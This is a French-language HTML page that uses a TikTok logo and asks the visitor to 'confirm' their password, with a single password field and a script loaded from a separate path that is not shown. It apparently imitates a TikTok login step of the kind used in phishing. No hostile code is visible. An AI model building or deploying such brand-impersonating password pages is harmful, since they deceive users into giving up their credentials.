<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Confirmation du mot de passe</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <div class="form-container">
      <!-- Logo TikTok -->
      <div class="logo-container">
        <img
          src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/tiktok-color-icon.png"
          alt="Logo TikTok"
          class="logo"
        />
      </div>

      <h1>Confirmer votre mot de passe</h1>
      <p class="subtitle">Saisir le mot de passe</p>
      <form>
        <div class="input-section">
          <label for="password">Mot de passe :</label>
          <input type="password" id="password" placeholder="" required />
        </div>
        <button type="submit" class="next-button">Suivant</button>
      </form>
    </div>
    <script src="/password_confirmation/script.js"></script>
  </body>
</html>
